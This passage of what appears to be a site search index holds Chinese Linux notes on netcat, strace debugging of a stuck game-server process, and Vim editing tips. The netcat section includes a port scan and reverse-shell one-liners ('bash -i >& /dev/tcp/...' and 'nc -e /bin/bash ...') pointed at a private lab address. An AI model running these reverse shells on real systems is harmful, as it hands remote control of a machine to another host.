/bin/bash 192.168.21.136 5555 client: nc -lvp 5555 7.nc\u5176\u4ed6\u53c2\u6570 \uf0c1 \u53c2\u3000\u3000\u6570\uff1a -g<\u7f51\u5173> \u8bbe\u7f6e\u8def\u7531\u5668\u8dc3\u7a0b\u901a\u4fe1\u7f51\u5173\uff0c\u6700\u591a\u53ef\u8bbe\u7f6e8\u4e2a\u3002 -G<\u6307\u5411\u5668\u6570\u76ee> \u8bbe\u7f6e\u6765\u6e90\u8def\u7531\u6307\u5411\u5668\uff0c\u5176\u6570\u503c\u4e3a4\u7684\u500d\u6570\u3002 -h \u5728\u7ebf\u5e2e\u52a9\u3002 -i<\u5ef6\u8fdf\u79d2\u6570> \u8bbe\u7f6e\u65f6\u95f4\u95f4\u9694\uff0c\u4ee5\u4fbf\u4f20\u9001\u4fe1\u606f\u53ca\u626b\u63cf\u901a\u4fe1\u7aef\u53e3\u3002 -l \u4f7f\u7528\u76d1\u542c\u6a21\u5f0f\uff0c\u7ba1\u63a7\u4f20\u5165\u7684\u8d44\u6599\u3002 -n \u76f4\u63a5\u4f7f\u7528IP\u5730\u5740\uff0c\u800c\u4e0d\u901a\u8fc7\u57df\u540d\u670d\u52a1\u5668\u3002 -o<\u8f93\u51fa\u6587\u4ef6> \u6307\u5b9a\u6587\u4ef6\u540d\u79f0\uff0c\u628a\u5f80\u6765\u4f20\u8f93\u7684\u6570\u636e\u4ee516\u8fdb\u5236\u5b57\u7801\u503e\u5012\u6210\u8be5\u6587\u4ef6\u4fdd\u5b58\u3002 -p<\u901a\u4fe1\u7aef\u53e3> \u8bbe\u7f6e\u672c\u5730\u4e3b\u673a\u4f7f\u7528\u7684\u901a\u4fe1\u7aef\u53e3\u3002 -r \u4e71\u6570\u6307\u5b9a\u672c\u5730\u4e0e\u8fdc\u7aef\u4e3b\u673a\u7684\u901a\u4fe1\u7aef\u53e3\u3002 -s<\u6765\u6e90\u5730\u5740> \u8bbe\u7f6e\u672c\u5730\u4e3b\u673a\u9001\u51fa\u6570\u636e\u5305\u7684IP\u5730\u5740\u3002 -u \u4f7f\u7528UDP\u4f20\u8f93\u534f\u8bae\u3002 -v \u663e\u793a\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b\u3002 -w<\u8d85\u65f6\u79d2\u6570> \u8bbe\u7f6e\u7b49\u5f85\u8fde\u7ebf\u7684\u65f6\u95f4\u3002 -z \u4f7f\u75280\u8f93\u5165/\u8f93\u51fa\u6a21\u5f0f\uff0c\u53ea\u5728\u626b\u63cf\u901a\u4fe1\u7aef\u53e3\u65f6\u4f7f\u7528\u3002","title":"nc"},{"location":"linux_development/nc/#nc","text":"","title":"nc"},{"location":"linux_development/nc/#1","text":"nc -z -v -n 192.168.21.135 1-100 z\u53c2\u6570\u544a\u8bc9nc\u4f7f\u75280 \u8f93\u5165/\u8f93\u51fa\u6a21\u5f0f\uff0c\u4e00\u822c\u5728\u626b\u63cf\u901a\u4fe1\u7aef\u53e3\u7684\u65f6\u5019\u4f7f\u7528 v\u53c2\u6570\u663e\u793a\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b n\u53c2\u6570\u544a\u8bc9nc\u4e0d\u4f7f\u7528DNS\u53cd\u5411\u67e5\u8be2ip\u5730\u5740\u7684\u57df\u540d $ nc -z -v -n 192.168.122.135 1-100 nc: connect to 192.168.122.135 port 21 (tcp) failed: Connection refused Connection to 192.168.122.135 22 port [tcp/*] succeeded!","title":"1.\u7aef\u53e3\u626b\u63cf"},{"location":"linux_development/nc/#2","text":"server: nc -l 5555 client: nc 192.168.21.133 5555 l\u53c2\u6570\u4f7f\u7528\u76d1\u542c\u6a21\u5f0f\uff0c\u7ba1\u63a7\u4f20\u5165\u7684\u8d44\u6599","title":"2.\u505a\u4e3a\u901a\u4fe1\u4f7f\u7528"},{"location":"linux_development/nc/#3","text":"server: nc -l 5555< aa.txt client: nc -n 192.168.21.133 >aa.txt \u540c\u6837\u4e5f\u53ef\u4ee5\u4e92\u6362\uff0c\u4f20\u8f93\u6587\u4ef6 server: nc -l 5555 > aa.txt client: nc 192.168.21.133 5555 < aa.txt","title":"3.\u6587\u4ef6\u4f20\u8f93"},{"location":"linux_development/nc/#4","text":"\u6587\u4ef6\u53ef\u4ee5\u53d1\u9001\uff0c\u4f46\u662f\u76ee\u5f55\u4e5f\u540c\u6837\u53ef\u4ee5\u4f20\u8f93\uff0c\u5229\u7528\u7ba1\u9053\u4f20\u8f93\u8d77\u6765\u3002 server: tar -czvf- faith/ |nc -l 5555 client: nc -n 192.168.21.133 5555 | tar -zxvf -","title":"4.\u76ee\u5f55\u4f20\u8f93"},{"location":"linux_development/nc/#5","text":"server: nc localhost 1567 | mcrypt \u2013flush \u2013bare -F -q -d -m ecb > file.txt client: mcrypt \u2013flush \u2013bare -F -q -m ecb < file.txt | nc -l 1567","title":"5.\u52a0\u5bc6\u4f20\u8f93"},{"location":"linux_development/nc/#6shell","text":"server: nc -lvp 5555 bash -i >& /dev/tcp/192.168.21.136/5555 0 >&1 client: nc -lvp 5555 \u8fd8\u6709\u4e00\u79cd\uff1a server: nc -e /bin/bash 192.168.21.136 5555 client: nc -lvp 5555","title":"6.\u5efa\u7acbshell"},{"location":"linux_development/nc/#7nc","text":"\u53c2\u3000\u3000\u6570\uff1a -g<\u7f51\u5173> \u8bbe\u7f6e\u8def\u7531\u5668\u8dc3\u7a0b\u901a\u4fe1\u7f51\u5173\uff0c\u6700\u591a\u53ef\u8bbe\u7f6e8\u4e2a\u3002 -G<\u6307\u5411\u5668\u6570\u76ee> \u8bbe\u7f6e\u6765\u6e90\u8def\u7531\u6307\u5411\u5668\uff0c\u5176\u6570\u503c\u4e3a4\u7684\u500d\u6570\u3002 -h \u5728\u7ebf\u5e2e\u52a9\u3002 -i<\u5ef6\u8fdf\u79d2\u6570> \u8bbe\u7f6e\u65f6\u95f4\u95f4\u9694\uff0c\u4ee5\u4fbf\u4f20\u9001\u4fe1\u606f\u53ca\u626b\u63cf\u901a\u4fe1\u7aef\u53e3\u3002 -l \u4f7f\u7528\u76d1\u542c\u6a21\u5f0f\uff0c\u7ba1\u63a7\u4f20\u5165\u7684\u8d44\u6599\u3002 -n \u76f4\u63a5\u4f7f\u7528IP\u5730\u5740\uff0c\u800c\u4e0d\u901a\u8fc7\u57df\u540d\u670d\u52a1\u5668\u3002 -o<\u8f93\u51fa\u6587\u4ef6> \u6307\u5b9a\u6587\u4ef6\u540d\u79f0\uff0c\u628a\u5f80\u6765\u4f20\u8f93\u7684\u6570\u636e\u4ee516\u8fdb\u5236\u5b57\u7801\u503e\u5012\u6210\u8be5\u6587\u4ef6\u4fdd\u5b58\u3002 -p<\u901a\u4fe1\u7aef\u53e3> \u8bbe\u7f6e\u672c\u5730\u4e3b\u673a\u4f7f\u7528\u7684\u901a\u4fe1\u7aef\u53e3\u3002 -r \u4e71\u6570\u6307\u5b9a\u672c\u5730\u4e0e\u8fdc\u7aef\u4e3b\u673a\u7684\u901a\u4fe1\u7aef\u53e3\u3002 -s<\u6765\u6e90\u5730\u5740> \u8bbe\u7f6e\u672c\u5730\u4e3b\u673a\u9001\u51fa\u6570\u636e\u5305\u7684IP\u5730\u5740\u3002 -u \u4f7f\u7528UDP\u4f20\u8f93\u534f\u8bae\u3002 -v \u663e\u793a\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b\u3002 -w<\u8d85\u65f6\u79d2\u6570> \u8bbe\u7f6e\u7b49\u5f85\u8fde\u7ebf\u7684\u65f6\u95f4\u3002 -z \u4f7f\u75280\u8f93\u5165/\u8f93\u51fa\u6a21\u5f0f\uff0c\u53ea\u5728\u626b\u63cf\u901a\u4fe1\u7aef\u53e3\u65f6\u4f7f\u7528\u3002","title":"7.nc\u5176\u4ed6\u53c2\u6570"},{"location":"linux_development/strace/","text":"\u4f7f\u7528strace\u547d\u4ee4\u67e5\u627e\u8fdb\u7a0b\u5361\u6b7b\u95ee\u9898 \uf0c1 \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u540d\u5b57\uff1agamedev \u4ee5\u5b88\u62a4\u8fdb\u7a0b\u65b9\u5f0f\u542f\u52a8gamedev $ gamedev -d \u67e5\u770b\u8fdb\u7a0b\u53f7 [ps aux | grep \u7a0b\u5e8f\u540d\u5b57] $ ps aux | grep gamedev ztx 12706 11.1 1.0 361096 86608 ? Sl 16:35 3:49 ./gamedev -d ztx 12832 0.0 0.0 13608 944 pts/3 S+ 17:09 0:00 grep --color=auto gamedev \u53ef\u4ee5\u770b\u5230gamedev\u8fdb\u7a0b\u53f7\u4e3a12706 \u67e5\u770b\u8fdb\u7a0b\u4e2d\u6240\u6709\u7684\u7ebf\u7a0b\u53f7 [ pstree -p \u8fdb\u7a0b\u53f7 ] $ pstree -p 12706 gamedev(12706)\u2500\u252c\u2500{gamedev}(12707) \u251c\u2500{gamedev}(12719) \u251c\u2500{gamedev}(12720) \u2514\u2500{gamedev}(12721) \u53ef\u4ee5\u770b\u5230\u5171\u6709\u4e94\u4e2a\u7ebf\u7a0b\uff0c\u5176\u4e2d12706\u4e3a\u4e3b\u7ebf\u7a0b\uff0c\u548c\u8fdb\u7a0b\u53f7\u76f8\u540c\uff0c\u53e6\u5916\u670912707, 12719, 12720,12721\u56db\u4e2a\u5b50\u7ebf\u7a0b \u67e5\u770b\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5728\u8c03\u7528\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528 [sudo strace -T -r -p \u7ebf\u7a0b\u7f16\u53f7] $ sudo strace -T -r -p 12706 Process 12706 attached - interrupt to quit 0.000000 futex(0x7fa0c4b7f9d0, FUTEX_WAIT, 12721, NULL \u53ef\u4ee5\u770b\u5230\uff0c12706\u7ebf\u7a0b\u6b63\u963b\u585e\u5728futex\u7cfb\u7edf\u51fd\u6570\u4e0a\u9762\uff0c\u7136\u540e\u6309ctrl+c\u9000\u51fastrace\u547d\u4ee4 \u7ee7\u7eed\u67e5\u770b12707\u7ebf\u7a0b $ sudo strace -T -r -p 12707 0.000676 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000024> 0.000132 nanosleep({0, 500000}, NULL) = 0 <0.000587> 0.000681 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000044> 0.000178 nanosleep({0, 500000}, NULL) = 0 <0.000575> 0.000656 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000019> 0.000114 nanosleep({0, 500000}, NULL) = 0 <0.000575> 0.000653 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000019> 0.000117 nanosleep({0, 500000}, NULL) = 0 <0.000575> 0.000177 nanosleep({0, 500000}, NULL) = 0 <0.000575> \u53ef\u4ee5\u770b\u523012707\u7ebf\u7a0b\u6b63\u5728\u4e0d\u505c\u7684\u8c03\u7528stath\u989dnanosleep\u4e24\u4e2a\u7cfb\u7edf\u51fd\u6570\uff0cctl + c\u9000\u51fastrace\u547d\u4ee4 $ sudo strace -T -r -p 12719 Process 12932 attached - interrupt to quit 0.000000 epoll_wait(10, ^C <unfinished ...> \u53ef\u4ee5\u770b\u5230\u7f51\u7edc\u7ebf\u7a0b\u6b63\u963b\u585e\u5728epoll_wait\u51fd\u6570\u4e0a\u9762, ctl+c\u9000\u51fastrace\u547d\u4ee4 \u53ef\u4ee5\u7528\u540c\u6837\u7684\u65b9\u6cd5\u67e5\u770b12720 12721\u4e24\u4e2a\u7ebf\u7a0b\u5404\u81ea\u5728\u8c03\u7528\u4ec0\u4e48\u7cfb\u7edf\u51fd\u6570\u6216\u8005\u963b\u585e\u5728\u4ec0\u4e48\u7cfb\u7edf\u51fd\u6570\u4e0a \u7528\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5f88\u5feb\u5b9a\u4f4d\u5230\u7a0b\u5e8f\u7684\u6027\u80fd\u95ee\u9898\uff0c\u6bd4\u5982CPU\u9ad8\uff0c\u901a\u8fc7\u7ebf\u7a0b\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5b9a\u4f4d\u5230\u4ee3\u7801\u53ef\u80fd\u662f\u4ec0\u4e48\u5730\u65b9\u5199\u5f97\u6709\u95ee\u9898\uff0c \u7136\u540e\u8fdb\u5165\u5230\u4ee3\u7801\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898 \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cxiaoheqin\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002 \u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/xiaoheqin/article/details/51066284","title":"\u4f7f\u7528strace\u547d\u4ee4\u67e5\u627e\u8fdb\u7a0b\u5361\u6b7b\u95ee\u9898"},{"location":"linux_development/strace/#strace","text":"\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u540d\u5b57\uff1agamedev \u4ee5\u5b88\u62a4\u8fdb\u7a0b\u65b9\u5f0f\u542f\u52a8gamedev $ gamedev -d \u67e5\u770b\u8fdb\u7a0b\u53f7 [ps aux | grep \u7a0b\u5e8f\u540d\u5b57] $ ps aux | grep gamedev ztx 12706 11.1 1.0 361096 86608 ? Sl 16:35 3:49 ./gamedev -d ztx 12832 0.0 0.0 13608 944 pts/3 S+ 17:09 0:00 grep --color=auto gamedev \u53ef\u4ee5\u770b\u5230gamedev\u8fdb\u7a0b\u53f7\u4e3a12706 \u67e5\u770b\u8fdb\u7a0b\u4e2d\u6240\u6709\u7684\u7ebf\u7a0b\u53f7 [ pstree -p \u8fdb\u7a0b\u53f7 ] $ pstree -p 12706 gamedev(12706)\u2500\u252c\u2500{gamedev}(12707) \u251c\u2500{gamedev}(12719) \u251c\u2500{gamedev}(12720) \u2514\u2500{gamedev}(12721) \u53ef\u4ee5\u770b\u5230\u5171\u6709\u4e94\u4e2a\u7ebf\u7a0b\uff0c\u5176\u4e2d12706\u4e3a\u4e3b\u7ebf\u7a0b\uff0c\u548c\u8fdb\u7a0b\u53f7\u76f8\u540c\uff0c\u53e6\u5916\u670912707, 12719, 12720,12721\u56db\u4e2a\u5b50\u7ebf\u7a0b \u67e5\u770b\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5728\u8c03\u7528\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528 [sudo strace -T -r -p \u7ebf\u7a0b\u7f16\u53f7] $ sudo strace -T -r -p 12706 Process 12706 attached - interrupt to quit 0.000000 futex(0x7fa0c4b7f9d0, FUTEX_WAIT, 12721, NULL \u53ef\u4ee5\u770b\u5230\uff0c12706\u7ebf\u7a0b\u6b63\u963b\u585e\u5728futex\u7cfb\u7edf\u51fd\u6570\u4e0a\u9762\uff0c\u7136\u540e\u6309ctrl+c\u9000\u51fastrace\u547d\u4ee4 \u7ee7\u7eed\u67e5\u770b12707\u7ebf\u7a0b $ sudo strace -T -r -p 12707 0.000676 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000024> 0.000132 nanosleep({0, 500000}, NULL) = 0 <0.000587> 0.000681 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000044> 0.000178 nanosleep({0, 500000}, NULL) = 0 <0.000575> 0.000656 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000019> 0.000114 nanosleep({0, 500000}, NULL) = 0 <0.000575> 0.000653 stat(\"./log/gameserver.log\", {st_mode=S_IFREG|0664, st_size=245318243, ...}) = 0 <0.000019> 0.000117 nanosleep({0, 500000}, NULL) = 0 <0.000575> 0.000177 nanosleep({0, 500000}, NULL) = 0 <0.000575> \u53ef\u4ee5\u770b\u523012707\u7ebf\u7a0b\u6b63\u5728\u4e0d\u505c\u7684\u8c03\u7528stath\u989dnanosleep\u4e24\u4e2a\u7cfb\u7edf\u51fd\u6570\uff0cctl + c\u9000\u51fastrace\u547d\u4ee4 $ sudo strace -T -r -p 12719 Process 12932 attached - interrupt to quit 0.000000 epoll_wait(10, ^C <unfinished ...> \u53ef\u4ee5\u770b\u5230\u7f51\u7edc\u7ebf\u7a0b\u6b63\u963b\u585e\u5728epoll_wait\u51fd\u6570\u4e0a\u9762, ctl+c\u9000\u51fastrace\u547d\u4ee4 \u53ef\u4ee5\u7528\u540c\u6837\u7684\u65b9\u6cd5\u67e5\u770b12720 12721\u4e24\u4e2a\u7ebf\u7a0b\u5404\u81ea\u5728\u8c03\u7528\u4ec0\u4e48\u7cfb\u7edf\u51fd\u6570\u6216\u8005\u963b\u585e\u5728\u4ec0\u4e48\u7cfb\u7edf\u51fd\u6570\u4e0a \u7528\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5f88\u5feb\u5b9a\u4f4d\u5230\u7a0b\u5e8f\u7684\u6027\u80fd\u95ee\u9898\uff0c\u6bd4\u5982CPU\u9ad8\uff0c\u901a\u8fc7\u7ebf\u7a0b\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5b9a\u4f4d\u5230\u4ee3\u7801\u53ef\u80fd\u662f\u4ec0\u4e48\u5730\u65b9\u5199\u5f97\u6709\u95ee\u9898\uff0c \u7136\u540e\u8fdb\u5165\u5230\u4ee3\u7801\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898 \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cxiaoheqin\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002 \u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/xiaoheqin/article/details/51066284","title":"\u4f7f\u7528strace\u547d\u4ee4\u67e5\u627e\u8fdb\u7a0b\u5361\u6b7b\u95ee\u9898"},{"location":"linux_development/vim/","text":"Vim \uf0c1 \u8df3\u8f6c\u65b9\u5f0f \uf0c1 https://blog.csdn.net/qq_42475711/article/details/99646284 \u67e5\u627e\u5b57\u7b26\u4e32 \uf0c1 \u4ece\u5f00\u5934\u641c\u7d22\uff1a\u5728\u547d\u4ee4\u6a21\u5f0f\u4e0b\u8f93\u5165/\u540e\u8ddf\u8981\u67e5\u627e\u7684\u5b57\u7b26\u4e32 \u6309\u4e0b\u56de\u8f66\uff0c\u53ef\u4ee5\u770b\u5230vim\u628a\u5149\u6807\u79fb\u52a8\u5230\u8be5\u5b57\u7b26\u5904 \u518d\u6309n\uff08\u5c0f\u5199\uff09\u67e5\u770b\u4e0b\u4e00\u4e2a\u5339\u914d \u6309N(\u5927\u5199\uff09\u67e5\u770b\u4e0a\u4e00\u4e2a\u5339\u914d\uff08capslock\u5207\u6362\u5927\u5c0f\u5199\uff0c\u4e5f\u53ef\u4ee5\u5728\u5c0f\u5199\u72b6\u6001\u4e0b\u6309shift+n\uff09 \u4ece\u7ed3\u5c3e\u5904\u641c\u7d22\uff1a\uff1f\u8981\u641c\u7d22\u7684\u5b57\u7b26\u4e32\u6216\u5b57\u7b26 \u641c\u7d22\u540e\uff0c\u6253\u5f00\u522b\u7684\u6587\u4ef6\u53d1\u73b0\u4e5f\u88ab\u9ad8\u4eae\u4e86\uff0c\u600e\u4e48\u5173\u95ed \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b\uff0c\u8f93\u5165\uff1anohlsearch\u6216\u8005\uff1aset nohlsearch \u53ef\u4ee5\u7b80\u5199\u6210noh\u559dset-noh vi/vim \u4e2d\u53ef\u4ee5\u4f7f\u7528 :s \u547d\u4ee4\u6765\u66ff\u6362\u5b57\u7b26\u4e32\u3002\u4ee5\u524d\u53ea\u4f1a\u4f7f\u7528\u4e00\u79cd\u683c\u5f0f\u6765\u5168\u6587\u66ff\u6362\uff0c\u4eca\u5929\u53d1\u73b0\u8be5\u547d\u4ee4\u6709\u5f88\u591a\u79cd\u5199\u6cd5(vi \u771f\u662f\u5f3a\u5927\u554a\uff0c\u8fd8\u6709\u5f88\u591a\u9700\u8981\u5b66\u4e60)\uff0c\u8bb0\u5f55\u51e0\u79cd\u5728\u6b64\uff0c\u65b9\u4fbf\u4ee5\u540e\u67e5\u8be2\u3002 \u66ff\u6362 \u3000\u3000:s/vivian/sky/ \u66ff\u6362\u5f53\u524d\u884c\u7b2c\u4e00\u4e2a vivian \u4e3a sky \u3000\u3000:s/vivian/sky/g \u66ff\u6362\u5f53\u524d\u884c\u6240\u6709 vivian \u4e3a sky \u3000\u3000:n,$s/vivian/sky/ \u66ff\u6362\u7b2c n \u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c\u4e2d\u6bcf\u4e00\u884c\u7684\u7b2c\u4e00\u4e2a vivian \u4e3a sky \u3000\u3000:n,$s/vivian/sky/g \u66ff\u6362\u7b2c n \u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c\u4e2d\u6bcf\u4e00\u884c\u6240\u6709 vivian \u4e3a sky \u3000\u3000n \u4e3a\u6570\u5b57\uff0c\u82e5 n \u4e3a .\uff0c\u8868\u793a\u4ece\u5f53\u524d\u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c \u3000\u3000:%s/vivian/sky/(\u7b49\u540c\u4e8e :g/vivian/s//sky/) \u66ff\u6362\u6bcf\u4e00\u884c\u7684\u7b2c\u4e00\u4e2a vivian \u4e3a sky \u3000\u3000:%s/vivian/sky/g(\u7b49\u540c\u4e8e :g/vivian/s//sky/g) \u66ff\u6362\u6bcf\u4e00\u884c\u4e2d\u6240\u6709 vivian \u4e3a sky \u3000\u3000\u53ef\u4ee5\u4f7f\u7528 # \u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u6b64\u65f6\u4e2d\u95f4\u51fa\u73b0\u7684 / \u4e0d\u4f1a\u4f5c\u4e3a\u5206\u9694\u7b26 \u3000\u3000:s#vivian/#sky/# \u66ff\u6362\u5f53\u524d\u884c\u7b2c\u4e00\u4e2a vivian/ \u4e3a sky/ \u3000\u3000:%s+/oradata/apras/+/user01/apras1+ (\u4f7f\u7528+ \u6765 \u66ff\u6362 / )\uff1a /oradata/apras/\u66ff\u6362\u6210/user01/apras1/ \u884c\u53f7\u7684\u663e\u793a\u4e0e\u9690\u85cf \uf0c1 set nu\u7684\u4f5c\u7528\u7b49\u540c\u4e8eset number \u5982\u679c\u53ea\u662f\u4e34\u65f6\u663e\u793avim\u7684\u884c\u53f7\uff0c\u53ea\u987b\u6309ESC\u952e\u9000\u51fa\u7f16\u8f91\u5185\u5bb9\u6a21\u5f0f\uff0c\u8f93\u5165\u201c\uff1aset number\u201d\u540e\u6309\u56de\u8f66\u952e\uff0c\u5c31\u53ef\u4ee5\u663e\u793a\u884c\u53f7\u4e86\u3002\u8f93\u5165\u201c\uff1aset nonumber\u201d\u540e\u6309\u56de\u8f66\u952e\uff0c\u5c31\u53ef\u4ee5\u9690\u85cf\u884c\u53f7\u4e86\u3002 \u5982\u679c\u60f3\u8ba9vim\u6c38\u4e45\u663e\u793a\u884c\u53f7\uff0c\u5219\u9700\u8981\u4fee\u6539vim\u914d\u7f6e\u6587\u4ef6vimrc\u3002\u5982\u679c\u6ca1\u6709\u6b64\u6587\u4ef6\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u3002\u5728\u542f\u52a8vim\u65f6\uff0c\u5f53\u524d\u7528\u6237\u6839\u76ee\u5f55\u4e0b\u7684vimrc\u6587\u4ef6\u4f1a\u88ab\u81ea\u52a8\u8bfb\u53d6\uff0c\u56e0\u6b64\u4e00\u822c\u5728\u5f53\u524d\u7528\u6237\u7684\u6839\u76ee\u5f55\u4e0b\u521b\u5efavimrc\u6587\u4ef6\uff0c\u5373\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a vim ~/.vimrc \u5728\u6253\u5f00\u7684vimrc\u6587\u4ef6\u4e2d\u6700\u540e\u4e00\u884c\u8f93\u5165\uff1aset number \uff0c\u7136\u540e\u4fdd\u5b58\u9000\u51fa\u3002\u518d\u6b21\u7528vim\u6253\u5f00\u6587\u4ef6\u65f6\uff0c\u5c31\u4f1a\u663e\u793a\u884c\u53f7\u4e86\u3002 \u4fdd\u5b58\u65f6\u6ca1\u6743\u9650 \uf0c1 \u5f53\u4fdd\u5b58\u51fa\u73b0\u9519\u8bef E212: Can't open file for writing \u539f\u56e0\u662f\u6743\u9650\u4e0d\u591f\uff0c\u666e\u901a\u7528\u6237\u7528vi \u8fdb\u884c\u4e0d\u4e86\u4fdd\u5b58\uff0c\u9700\u8981\u4f7f\u7528\u8d85\u7ea7\u7528\u6237\u624d\u53ef\u4ee5\u3002\u4f46\u662f\u6b64\u65f6\u5df2\u7ecf\u7f16\u8f91\uff0c\u9000\u51fa\u540e\u91cd\u65b0\u4ee5sudo\u6743\u9650\u6253\u5f00\u8fd8\u8981\u91cd\u65b0\u7f16\u8f91\uff0c\u592a\u8fc7\u9ebb\u70e6\u3002\u6b64\u65f6\u9700\u8981\u5728\u547d\u4ee4\u6a21\u5f0f\u8f93\u5165 w ! sudo tee % > /dev/null Which will save the file. \u4f7f\u7528vim\u65f6\uff0c\u5982\u679c\u4f60\u4e0d\u5c0f\u5fc3\u6309\u4e86 Ctrl + s\u540e\uff0c\u4f60\u4f1a\u53d1\u73b0\u4e0d\u80fd\u8f93\u5165\u4efb\u4f55\u4e1c\u897f\u4e86\uff0c\u50cf\u6b7b\u6389\u4e86\u4e00\u822c\u3002\u5176\u5b9evim\u5e76\u6ca1\u6709\u6b7b\u6389\uff0c\u8fd9\u65f6vim\u53ea\u662f\u505c\u6b62\u5411\u7ec8\u7aef\u8f93\u51fa\u800c\u5df2\uff0c\u8981\u60f3\u9000\u51fa\u8fd9\u79cd\u72b6\u6001\uff0c\u53ea\u9700\u6309Ctrl + q \u5373\u53ef\u6062\u590d\u6b63\u5e38\u3002 u \u64a4\u9500\u4e0a\u4e00\u6b65\u7684\u64cd\u4f5c Ctrl+r \u6062\u590d\u4e0a\u4e00\u6b65\u88ab\u64a4\u9500\u7684\u64cd\u4f5c \u5982\u679c\u4f60\u8f93\u5165\u201cu\u201d\u4e24\u6b21\uff0c\u4f60\u7684\u6587\u672c\u6062\u590d\u539f\u6837\uff0c\u90a3\u5e94\u8be5\u662f\u4f60\u7684Vim\u88ab\u914d\u7f6e\u5728Vi\u517c\u5bb9\u6a21\u5f0f\u4e86\u3002 \u590d\u5236\u7c98\u8d34 \uf0c1 \u9009\u5b9a\u6587\u672c\u5757\u3002\u4f7f\u7528v\u8fdb\u5165\u53ef\u89c6\u6a21\u5f0f\uff0c\u79fb\u52a8\u5149\u6807\u952e\u9009\u5b9a\u5185\u5bb9\u3002 2.\u590d\u5236\u7684\u547d\u4ee4\u662fy\uff0c\u5373yank\uff08\u63d0\u8d77\uff09 \uff0c\u5e38\u7528\u7684\u547d\u4ee4\u5982\u4e0b\uff1a y \u5728\u4f7f\u7528v\u6a21\u5f0f\u9009\u5b9a\u4e86\u67d0\u4e00\u5757\u7684\u65f6\u5019\uff0c\u590d\u5236\u9009\u5b9a\u5757\u5230\u7f13\u51b2\u533a\u7528\uff1b yy \u590d\u5236\u6574\u884c\uff08nyy\u6216\u8005yny \uff0c\u590d\u5236n\u884c\uff0cn\u4e3a\u6570\u5b57\uff09\uff1b y^ \u590d\u5236\u5f53\u524d\u5230\u884c\u5934\u7684\u5185\u5bb9\uff1b y$ \u590d\u5236\u5f53\u524d\u5230\u884c\u5c3e\u7684\u5185\u5bb9\uff1b yw \u590d\u5236\u4e00\u4e2aword \uff08nyw\u6216\u8005ynw\uff0c\u590d\u5236n\u4e2aword\uff0cn\u4e3a\u6570\u5b57\uff09\uff1b yG \u590d\u5236\u81f3\u6863\u5c3e\uff08nyG\u6216\u8005ynG\uff0c\u590d\u5236\u5230\u7b2cn\u884c\uff0c\u4f8b\u59821yG\u6216\u8005y1G\uff0c\u590d\u5236\u5230\u6863\u5c3e\uff09 \u526a\u5207\u7684\u547d\u4ee4\u662fd\uff0c\u5373delete\uff0cd\u4e0ey\u547d\u4ee4\u57fa\u672c\u7c7b\u4f3c\uff0c\u6240\u4ee5\u4e24\u4e2a\u547d\u4ee4\u7528\u6cd5\u4e00\u6837\uff0c\u5305\u62ec\u542b\u6709\u6570\u5b57\u7684\u7528\u6cd5. d \u526a\u5207\u9009\u5b9a\u5757\u5230\u7f13\u51b2\u533a\uff1b dd \u526a\u5207\u6574\u884c d^ \u526a\u5207\u81f3\u884c\u9996 d$ \u526a\u5207\u81f3\u884c\u5c3e dw \u526a\u5207\u4e00\u4e2aword dG \u526a\u5207\u81f3\u6863\u5c3e \u7c98\u8d34\u7684\u547d\u4ee4\u5f0fp\uff0c\u5373put\uff08\u653e\u4e0b\uff09 p 